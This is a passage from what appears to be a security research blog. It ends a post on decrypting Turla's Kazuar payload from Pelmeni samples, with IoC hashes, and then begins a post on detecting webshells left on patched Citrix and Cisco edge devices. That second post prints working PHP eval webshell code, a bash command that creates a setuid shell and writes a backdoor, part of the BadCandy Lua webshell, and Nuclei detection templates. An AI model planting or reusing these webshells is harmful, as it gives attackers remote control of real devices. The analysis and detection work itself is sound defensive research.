<span class="n">kazuar_file_offset</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="nf">get_offset_from_rva</span><span class="p">(</span><span class="n">kazuar_rva</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Extracted Kazuar address </span><span class="si">{</span><span class="n">kazuar_address</span><span class="si">}</span><span class="s"> and payload size </span><span class="si">{</span><span class="n">kazuar_size</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Start decryption of Kazuar
</span><span class="n">decrypted</span> <span class="o">=</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nb">bin</span><span class="p">[</span><span class="n">kazuar_file_offset</span><span class="p">:</span><span class="n">kazuar_file_offset</span><span class="o">+</span><span class="n">kazuar_size</span><span class="p">],</span> <span class="n">seed</span><span class="p">)</span>
<span class="k">if</span> <span class="n">decrypted</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x4d\x5a\x90\x00</span><span class="sh">"</span><span class="p">):</span>   <span class="c1"># If extract starts with MZ header, encryption succeeded
</span>    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">kazuar_extract_</span><span class="si">{</span><span class="n">seed</span><span class="si">}</span><span class="s">.exe</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="nb">file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Wrote decrypted Kazuar payload for seed </span><span class="si">{</span><span class="n">seed</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 7: Extracting and decrypting Kazuar</span></p>

<p>As can be seen from Listing 7, we are ready to start extracting and decrypting Kazuar payloads. Table 1 shows the results of running this script against all samples of Pelmeni I could find. I will include the file hashes, seeds, resulting Kazuar file hash, and Kazuar file size in the table (which will immediately also be the IoC list for this post). At first sight, there are two different variants based on the large deviation in size.</p>

<p><span class="centered-text">Table 1: Details about various Pelmeni and embedded Kazuar samples</span></p>

<table>
  <thead>
    <tr>
      <th>Pelmeni Hash (SHA256)</th>
      <th>Seed</th>
      <th>Kazuar Hash (SHA256)</th>
      <th>Kazuar File Size</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>00256c7fd9a36c6a4805c467b15b3a72dbac2e6dbd12abe7d768f20ce6c8f09f</td>
      <td><code class="language-plaintext highlighter-rouge">0xf1784656</code></td>
      <td>c41b19a5c5f1fee9f9d7a0a943bec10b8838ff1862b8776c45ee6802d19bfae8</td>
      <td>2.4mb</td>
    </tr>
    <tr>
      <td>15f5e4808549ff67a79f84e23659da912ebbc1dc7c7b100c12b72384a27e412a</td>
      <td><code class="language-plaintext highlighter-rouge">0xecc08599</code></td>
      <td>802e3b92dedcf36df2a3e4032ead5190a0ea856b8bb555f8c5e0e7389076fce2</td>
      <td>2.4mb</td>
    </tr>
    <tr>
      <td>174b10038dfa52b214e79c950bfdb67fe7489c0c8c06a1af83f96f1e1c6a996c</td>
      <td><code class="language-plaintext highlighter-rouge">0x7f6eefab</code></td>
      <td>ae4b2c3eb82bcfdac52d15c521a0b397c067f66f77be0c8a004b1ff824a3715e</td>
      <td>1.7mb</td>
    </tr>
    <tr>
      <td>18cb3a47679f9c1e5e57d3e8c0d70b521c30227c77705fe20c0eb2057a278ce4</td>
      <td><code class="language-plaintext highlighter-rouge">0xa77e7107</code></td>
      <td>c1db26f15d5c3721e45dc8f5a37528e731f0ca4b32ada0b26980e786ced5d5ab</td>
      <td>2.4mb</td>
    </tr>
    <tr>
      <td>2164d54c415b48e906ad972a14d45c82af7cab814c6cf11729a994249690ed97</td>
      <td><code class="language-plaintext highlighter-rouge">0xe257eb0e</code></td>
      <td>2352d77bbd985eea66bfd02bb10a86a171505f981f022bc4451aed1b3cc3705b</td>
      <td>1.7mb</td>
    </tr>
    <tr>
      <td>55580aedc4429496ef13080545f2ec6014e4e0f0774918dfa7fd12f048f2bdd2</td>
      <td><code class="language-plaintext highlighter-rouge">0xa7655e3f</code></td>
      <td>0fd34087b765db5da47c24b5333ddb63ecae0024977b09d9dcd4d2812eeac481</td>
      <td>1.7mb</td>
    </tr>
    <tr>
      <td>606d19b0ebc8fb039d6c7daccf31b62983dce3a3c517ffbede6a8b620930861e</td>
      <td><code class="language-plaintext highlighter-rouge">0xfc98a4db</code></td>
      <td>69a23efb7f0990c1d4e6a594c9992e318a0e557f2d4e79d04ad3db47d82f45da</td>
      <td>2.4mb</td>
    </tr>
    <tr>
      <td>7d4c1883c4b61ca5c4059f13d5e2c74ed3de728b53d464036c6dbd7828f23c2c</td>
      <td><code class="language-plaintext highlighter-rouge">0xd9ab6d40</code></td>
      <td>70848496a300b977cba9a7bdaf89f573dc3f2e049d0ef3a5717abade085d52f5</td>
      <td>1.7mb</td>
    </tr>
    <tr>
      <td>9b97e740b65bc609210f095cd9407c990a9f71f580f001ea07300228c5256d62</td>
      <td><code class="language-plaintext highlighter-rouge">0x741e02cd</code></td>
      <td>2a1269a376cbb05c6449ae5c0079c3a59d10bd9670bbb2500f1fc63dda567067</td>
      <td>2.4mb</td>
    </tr>
    <tr>
      <td>ac10acd6391e18cbbf2c11198175959caa7adfa15144126f1ce9aa3c9b0f10e4</td>
      <td><code class="language-plaintext highlighter-rouge">0xd03a4b24</code></td>
      <td>e3362c7509ad77c6f3ec5ffd026f9d6bd3e8e43559c05e10d3060ef75b1c7f5e</td>
      <td>1.7mb</td>
    </tr>
    <tr>
      <td>c1fdbf5a33a0288065d99082bde39a9401bc3ab346fdef276bde746e15a889cb</td>
      <td><code class="language-plaintext highlighter-rouge">0xfbb7f137</code></td>
      <td>3539f53ac43ac6b8392d1663070772077fe910da69c2a914bc917fd41ec04f4c</td>
      <td>1.7mb</td>
    </tr>
    <tr>
      <td>cccd6327dd5beee19cc3744b40f954c84ab016564b896c257f6871043a21cf0a</td>
      <td><code class="language-plaintext highlighter-rouge">0x4ba34f4c</code></td>
      <td>c8439ce0c1fd34bf56ff022e2b2640901daa61f7b20a8593cab60f96461f1b18</td>
      <td>2.4mb</td>
    </tr>
    <tr>
      <td>d577e82aec669ab2817c135413e16acd3b871568de04ac8eb65a6dbcb5c7048f</td>
      <td><code class="language-plaintext highlighter-rouge">0xcb6f7d6</code></td>
      <td>4111bdb0bc7a39dd10f2a552f0b481f2636079501b703e2e7d28421d76a3fe9f</td>
      <td>2.4mb</td>
    </tr>
    <tr>
      <td>ebf10222bdd19bd8f14b7e94694c1534d4fe1d1047034aee7ffe9492cad4a92f</td>
      <td><code class="language-plaintext highlighter-rouge">0x7cc6d6a6</code></td>
      <td>046fc6ee4bfc51d12ab7b7a643111076744a898fb21011a4ef4a19eefdb152b1</td>
      <td>1.7mb</td>
    </tr>
    <tr>
      <td>f6b7b3072b3e343c246057c2518693d353c72ee62f9d9aaaa9431af3ce621568</td>
      <td><code class="language-plaintext highlighter-rouge">0x61f8817c</code></td>
      <td>41b2449673d811d78d3ccfa354ccb2f19d8ad03f846d3797caf5cbabedc0417c</td>
      <td>2.4mb</td>
    </tr>
    <tr>
      <td>d216d3a993459cd48ef46afc64c9c341e143051cbfb77727cc7ad71d1eaef84f</td>
      <td><code class="language-plaintext highlighter-rouge">0xa7655e3f</code></td>
      <td>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</td>
      <td>2.4mb</td>
    </tr>
  </tbody>
</table>

<p>All Kazuar samples extracted from these Pelmeni samples are valid .NET binaries and are consistent with <a href="https://unit42.paloaltonetworks.com/pensive-ursa-uses-upgraded-kazuar-backdoor/">Unit42’s analysis</a>. The metadata of the resulting files also show the altered timestamp and the Kazuar binaries can be decompiled using tools like ILSpy.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ file kazuar_extract_0xa7655e3f.exe
kazuar_extract_0xa7655e3f.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
</code></pre></div></div>
<p><span class="centered-text">Listing 8: Kazuar file information</span></p>

<h1 id="how-to-proceed">How to proceed?</h1>
<p>The Pelmeni wrapper demonstrates that even advanced actors like Turla can weaken their own operations through poor cryptographic design. Environmental keying, such as using the victim’s host name to derive the decryption key, is a clever operational safeguard. However, reusing a weak pseudorandom number generator across both export name and payload decryption made the entire scheme vulnerable.</p>

<p>The analysis of the decrypted Kazuar payloads, including command and control infrastructure, is already well documented in the Lab52 post and other sources. This blog focused instead on making the vulnerability in Pelmeni’s cryptographic routine actionable. The ability to recover the seed without needing access to the victim environment provides a practical tool for tracking and analyzing samples in the wild.</p>

<p>This case reinforces a broader lesson in malware analysis: even small implementation flaws in custom cryptographic code can create valuable openings for visibility and intelligence.</p>

<p>If you are a reverse engineer, threat analyst, or incident responder, I hope this post helped you in your work or provided a new perspective. If you come across a new variant or a similar loader with weak crypto, feel free to get in touch.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Observations on Threat Intelligence" /><summary type="html"><![CDATA[Turla’s Pelmeni Wrapper reveals how flawed cryptographic choices in malware design can create tracking opportunities. This post dissects how a weak and predictable pseudorandom generator exposed Kazuar’s payload and what this means for threat intelligence.]]></summary></entry><entry><title type="html">Scanning Beyond the Patch: A Public-Interest Hunt for Hidden Shells</title><link href="http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix.html" rel="alternate" type="text/html" title="Scanning Beyond the Patch: A Public-Interest Hunt for Hidden Shells" /><published>2025-06-14T00:00:00+02:00</published><updated>2025-06-14T00:00:00+02:00</updated><id>http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix</id><content type="html" xml:base="http://localhost:4000/2025/06/14/patching-is-not-enough-persistent-backdoors-after-the-fix.html"><![CDATA[<blockquote>
  <p><strong>Summary:</strong><br />
This blog explores three real-world cases—Citrix ADC (CVE-2023-3519), Cisco IOS XE (CVE-2023-20273), and Ivanti Connect Secure (CVE-2024-21893)—where patching alone failed to remove persistent backdoors from edge devices.<br />
We detail how these implants worked, how they evaded detection, and how we developed ethical scanning methods at DIVD to detect their remnants through behavioral side channels.<br />
Each case shows that compromise can survive remediation, and why defenders must look beyond patch status to detect real risk.</p>
</blockquote>

<p>On the internet’s edge, patching is no longer enough. With attack waves seemingly becoming more opportunistic, it is also important to look for signs that an edge device has already been compromised.</p>

<p>Over the past few years, I’ve notified thousands of organizations about critical vulnerabilities in their VPNs, firewalls, load balancers, and routers. Very often, the actual patching takes a while, or our notification takes some time to arrive. Some organizations may patch by themselves, wondering why the notification they received is relevant at all. They may not realize the uncomfortable truth: patching doesn’t undo compromise.</p>

<p>Attackers that target edge devices often exploit a narrow window of exposure, with <a href="https://vulncheck.com/blog/exploitation-trends-q1-2025">28.3% of vulnerabilities being exploited within a single day</a> of their CVE disclosure in 2025! Some of these exploit waves leave implants that persist even after the initial vulnerability is closed, which is why it’s so important to verify that the underlying system hasn’t been compromised.</p>

<p>The following post is about what we miss when we treat patching as the finish line and why public-interest researchers must go further: scanning not just for vulnerabilities, but for the residue of compromise.</p>

<h1 id="backdoors-after-the-fix">Backdoors after the fix</h1>
<p>Our dependency on edge devices has <a href="https://www.bls.gov/opub/btn/volume-13/remote-work-productivity.htm">drastically increased</a> since the COVID-19 pandemic, as they support the possibility to work remotely. They’re externally reachable, typically trusted by internal networks, and not always monitored with the same rigor as desktop endpoints or cloud workloads. This, among other reasons, makes edge devices a high-value target. When an attacker gets in through a zero-day or n-day vulnerability, their goal isn’t just access. It’s persistence.</p>

<p>At DIVD, we’ve seen this firsthand. In multiple investigations, such as <a href="https://blog.fox-it.com/2023/08/15/approximately-2000-citrix-netscalers-backdoored-in-mass-exploitation-campaign/amp/">DIVD-2023-00033</a>, by the time a vendor issues a patch and the admin applies it, the exploit path may be closed, but a backdoor is already installed. These aren’t theoretical risks. From simple PHP <code class="language-plaintext highlighter-rouge">eval()</code> implants to backdoors and credential stealers embedded in existing code, masked, and even re-signed by the malware itself, adversaries are developing significant capability in this area and are <a href="https://www.compliancepoint.com/cyber-security/hackers-exploiting-edge-devices-how-to-defend-your-organization/">increasingly treating</a> edge devices as a beachhead.</p>

<p>Some of these implants prevent or survive firmware updates, evade scans for Indicators of Compromise (IoCs), and blend into system components. Yet, after patching, many operators seem to stop looking. The logs are cleared, the traffic looks clean, the box is assumed safe. However, unless we actively look for signs of compromise, patching may only treat the symptom, not the infection.</p>

<h1 id="finding-what-the-patch-missed">Finding what the patch missed</h1>
<p>Despite vendors releasing patches and integrity checks, we’ve repeatedly encountered edge systems that remain compromised. This makes backdoors an interesting case for our public-interest scanning at DIVD. What follows are anonymized cases that illustrate the gap between vulnerability remediation and true system recovery, and why operators need to look further than just the vulnerability. An important discussion in this context is how to approach the backdoor ethically as I previously discussed in my post on <a href="https://disclosing.observer/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html">scanning ethics</a>.</p>

<p>Not triggering any unintended behavior is essential, so the scanning methodology discussed below for each CVE does not focus on directly using the backdoor to confirm its presence. While this is possible in many cases through the use of magic bytes, keys, or HTTP parameters, focusing on side channels ensures the proportionality of the scan.</p>

<table>
  <thead>
    <tr>
      <th>Appliance</th>
      <th style="text-align: left">Vulnerability</th>
      <th style="text-align: center">Response signature</th>
      <th style="text-align: right">Scanning method</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Citrix ADC NetScaler</td>
      <td style="text-align: left">CVE-2023-3519</td>
      <td style="text-align: center">HTTP 201 on v1, empty HTTP 404 on v2.</td>
      <td style="text-align: right">Scan for HTTP 201 or empty 404 (without Content-Length) on known PHP paths.</td>
    </tr>
    <tr>
      <td>Cisco IOS-XE</td>
      <td style="text-align: left">CVE-2023-20198</td>
      <td style="text-align: center">Fake 404 Not Found page on v1, shell version or 18-character string on v2.</td>
      <td style="text-align: right">Scan by adding <code class="language-plaintext highlighter-rouge">%25</code> for the first version and checking for 404 Not Found, scanning by using the <code class="language-plaintext highlighter-rouge">logon_hash=1</code> parameter for the second version.</td>
    </tr>
    <tr>
      <td>Ivanti Connect Secure</td>
      <td style="text-align: left">CVE-2024-21893</td>
      <td style="text-align: center">HTTP 200 response on endpoint with random characters or the output of <code class="language-plaintext highlighter-rouge">uname -a</code>, expected behavior is a 404.</td>
      <td style="text-align: right">Scanning on created files by the exploit on index.txt, index1.txt, or index2.txt.</td>
    </tr>
  </tbody>
</table>

<h2 id="citrix-adc-and-netscaler-gateway---cve-2023-3519">Citrix ADC and NetScaler Gateway - CVE-2023-3519</h2>
<p>In July 2023, Citrix <a href="https://support.citrix.com/external/article?articleUrl=CTX561482-citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467&amp;language=en_US">disclosed</a> CVE-2023-3519, a critical unauthenticated Remote Code Execution vulnerability in Citrix ADC and NetScaler Gateway when configured as a gateway or AAA virtual server. The vulnerability was actively exploited in the wild at the time of disclosure.</p>

<p>To support remediation at scale, DIVD, in collaboration with Fox-IT, initiated an internet-wide scan campaign under investigation <a href="https://csirt.divd.nl/cases/DIVD-2023-00030/">DIVD-2023-00030</a> for the vulnerability and <a href="https://csirt.divd.nl/cases/DIVD-2023-00033/">DIVD-2023-00033</a> for the backdoor campaign. This was one of the first cases where I experienced how quickly attackers can establish persistence before patches are even applied.</p>

<h3 id="scanning-for-the-backdoors">Scanning for the Backdoors</h3>
<p>The first vulnerability had significant activity around it and many different backdoors. While there was nation state activity around this vulnerability, <a href="https://cloud.google.com/blog/topics/threat-intelligence/citrix-zero-day-espionage/">with a suspected Chinese threat actor spreading implants (dubbed SECRETSAUCE)</a>, it is unclear whether the shell we investigated was criminal or nation-state. On July 20th, 2023, implants started appearing. While the nation state shells appeared under the <code class="language-plaintext highlighter-rouge">/var/vpn/themes</code> directory, were asymmetric, and did not contain any clear mistakes, the criminal webshell did and started appearing in the <code class="language-plaintext highlighter-rouge">/logon/LogonPoint/uiareas</code> directory.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">http_response_code</span><span class="p">(</span><span class="mi">201</span><span class="p">);</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 1: Citrix Webshell version 1</span></p>

<p>This first version of the webshell (illustrated in Listing 1) was a simple PHP <code class="language-plaintext highlighter-rouge">eval</code> backdoor that returns an HTTP 201 (created) response code and passed the value of POST parameter <code class="language-plaintext highlighter-rouge">5</code> to PHP <code class="language-plaintext highlighter-rouge">eval()</code>. The mistake here is that this backdoor introduces a sidechannel: if the endpoint does not exist, it returns HTTP 404 as the response code. Due to the order of the statements, it will return HTTP 201 regardless of the <code class="language-plaintext highlighter-rouge">eval()</code> call succeeding. This allowed us to scan for HTTP 201 as the response code.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">citrix-implant-cve-2023-3519</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Citrix CVE-2023-3519 Implant Scan</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/logon/LogonPoint/uiareas/{{uri}}"</span>
    
    <span class="na">payloads</span><span class="pi">:</span>
      <span class="na">uri</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s2">"</span><span class="s">{{filename:common_php_filenames.txt}}"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">status</span>
        <span class="na">status</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="m">201</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 2: Nuclei scanning template for the Citrix Webshells</span></p>

<p>This backdoor was included under filenames that match the most <a href="https://gitlab.com/kalilinux/packages/seclists/blob/b83a756bb2c06f94c03e525326e8480981b58a9c/Discovery/Web-Content/Common-PHP-Filenames.txt">common PHP filenames</a>, among which <code class="language-plaintext highlighter-rouge">prod.php</code>, <code class="language-plaintext highlighter-rouge">log.php</code>, <code class="language-plaintext highlighter-rouge">logout.php</code>. This allowed us to iterate over the list of filenames and query the target system for the presence of the backdoor. The downside of this is that, given each system would have to accept a few thousand requests from us, we had to diffuse scan targets and scan over a prolonged time as to not overwhelm systems with our scanning. The scan template is shown in Listing 2.</p>

<p>On July 21st, however, the implant moved. There was a sudden drop in vulnerable devices as the old implants seemed to have been used to deploy a newer, more ‘sophisticated’ implant. As shown in Listing 3, instead of returning an HTTP 201 response, the implant now returns an empty HTTP 404 and introduced a key to the <code class="language-plaintext highlighter-rouge">eval()</code> call. This functions as a basic authentication mechanism.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /bin/sh /var/nss <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +s /var/nss <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> /netscaler/ns_gui/epa/scripts/[redacted]<span class="p">;</span> 
<span class="nb">echo</span> <span class="s1">'&lt;?php  http_response_code(404); @eval($_POST[redacted]);'</span> <span class="o">&gt;</span> 
/netscaler/ns_gui/epa/scripts/[redacted]/[redacted].php
</code></pre></div></div>
<p><span class="centered-text">Listing 3: Evolution of the Citrix Webshell to further obfuscate</span></p>

<p>The same mistake as with the previous implant was repeated here, though. Returning an empty HTTP 404 response is atypical for Citrix software. It typically returns an HTTP 302 or at least contains some headers (in particular a Content-Length header). So this time, we could scan for that. This led us to refine the scanning template for 404 anomalies (Listing 4).</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">citrix-implant-cve-2023-3519-v2</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Citrix CVE-2023-3519 Implant Scan - v2</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/logon/LogonPoint/uiareas/{{filename}}"</span>
    
    <span class="na">payloads</span><span class="pi">:</span>
      <span class="na">filename</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s2">"</span><span class="s">{{filename:common_php_filenames.txt}}"</span>
    
    <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">and</span>
    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">status</span>
        <span class="na">status</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="m">404</span>

      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">regex</span>
        <span class="na">part</span><span class="pi">:</span> <span class="s">header</span>
        <span class="na">negative</span><span class="pi">:</span> <span class="kc">true</span>
        <span class="na">regex</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s1">'</span><span class="s">(?i)content-length:'</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 4: Nuclei scanning template for the updated Citrix Webshells</span></p>

<h3 id="results-increasing-global-overview-with-759">Results: increasing global overview with 759%</h3>
<p>Together with Fox-IT, we scanned 264.000 IP addresses. Of these IPs, 31.127 Citrix hosts were vulnerable at that time. Of these 31.127 vulnerable hosts, we found 2491 implants worldwide, nearly eight times more than were previously known. As Figure 1 shows, Europe and Asia were popular in particular. Through collaboration with various channels such as The Shadowserver Foundation, government CSIRTs, and directly notifying, we could decrease the number of backdoors steadily over the months after.</p>

<figure class="centered-img">
  <img style="margin:auto; display:block; padding:10px; max-width:79%;" src="../../../assets/backdoored-top-20-citrix.png" alt="VEP Process" />
  <figcaption style="text-align:center;">Figure 1: Fox-IT numbers of backdoored instances, source: NCC Group</figcaption>
</figure>

<h2 id="cisco-ios-xe---cve-2023-20273">Cisco IOS-XE - CVE-2023-20273</h2>
<p>In late September 2023, Cisco disclosed CVE-2023-20198, a critical unauthenticated Remote Code Execution vulnerability affecting the Web UI of Cisco IOS-XE devices. The bug allowed attackers to create privileged user accounts without authentication, often as a precursor to installing a persistent implant via the vulnerability. Once deployed, the implant allowed arbitrary command execution over HTTPS and could persist across reboots in some of the cases.</p>

<p>This vulnerability saw an explosive amount of exploit activity as well, with a threat actor installing the BadCandy malware on a global scale. DIVD scanned for these implants under investigation <a href="https://csirt.divd.nl/cases/DIVD-2023-00038/">DIVD-2023-00038</a>.</p>

<h3 id="scanning-for-the-backdoors-1">Scanning for the Backdoors</h3>
<p>The implant installed using this vulnerability, called BadCandy, is a bit more complex than the previous implants. BadCandy is a Lua-based webshell and consists of 29 lines of code that facilitate arbitrary command execution and is disguised as an Nginx configuration. The attacker can use the webshell by creating HTTP POST requests the <code class="language-plaintext highlighter-rouge">/webui/logoutconfirm.html</code> endpoint.</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">location</span> <span class="o">/</span><span class="n">webui</span><span class="o">/</span><span class="n">logoutconfirm</span><span class="p">.</span><span class="n">html</span> <span class="p">{</span>
    <span class="n">add_header</span> <span class="n">Content</span><span class="o">-</span><span class="n">Type</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span>	
    <span class="n">add_header</span> <span class="n">Cache</span><span class="o">-</span><span class="n">Control</span> <span class="s1">'no-cache, no-store, must-revalidate'</span><span class="p">;</span>
    <span class="n">add_header</span> <span class="n">Pragma</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">;</span>
    <span class="n">add_header</span> <span class="n">Strict</span><span class="o">-</span><span class="n">Transport</span><span class="o">-</span><span class="n">Security</span> <span class="s2">"max-age=31536000; includeSubdomain"</span><span class="p">;</span>
    <span class="n">content_by_lua_block</span> <span class="p">{</span>
            
            <span class="kd">local</span> <span class="n">method</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_method</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_headers</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">params</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_uri_args</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="ow">and</span> <span class="n">params</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="p">)</span> <span class="k">then</span>
                    <span class="kd">local</span> <span class="n">authcode</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">],</span> <span class="s2">"^%s*(.-)%s*$"</span><span class="p">,</span> <span class="s2">"%1"</span><span class="p">)</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">authcode</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">authcode</span><span class="p">,</span> <span class="s2">"^%w+$"</span><span class="p">)</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                        <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                            <span class="kd">local</span> <span class="n">shasum</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
                            <span class="n">shasum</span> <span class="o">=</span> <span class="nb">string.lower</span><span class="p">(</span><span class="n">shasum</span><span class="p">)</span>
                            <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">shasum</span><span class="p">,</span> <span class="s2">"&lt;redacted&gt;"</span><span class="p">)</span> <span class="k">then</span>
                                <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
                            <span class="k">end</span>
                            <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
                        <span class="k">end</span>
                    <span class="k">end</span>
                <span class="k">end</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">authorized</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="k">then</span>
                    <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">read_body</span><span class="p">()</span>
                    <span class="kd">local</span> <span class="n">body</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">get_body_data</span><span class="p">()</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"menu"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"menu"</span><span class="p">]</span> <span class="o">~=</span> <span class="s2">""</span><span class="p">)</span> <span class="k">then</span>
                        <span class="n">content</span> <span class="o">=</span> <span class="s2">"/2010202301/"</span>
                    <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"1"</span><span class="p">)</span> <span class="k">then</span>
                        <span class="n">content</span> <span class="o">=</span> <span class="s2">"&lt;redacted&gt;"</span>
                    <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">~=</span> <span class="n">niL</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"logon_hash"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"&lt;redacted&gt;&gt;"</span> <span class="ow">and</span> <span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"subsystem"</span><span class="p">)</span> <span class="k">then</span>
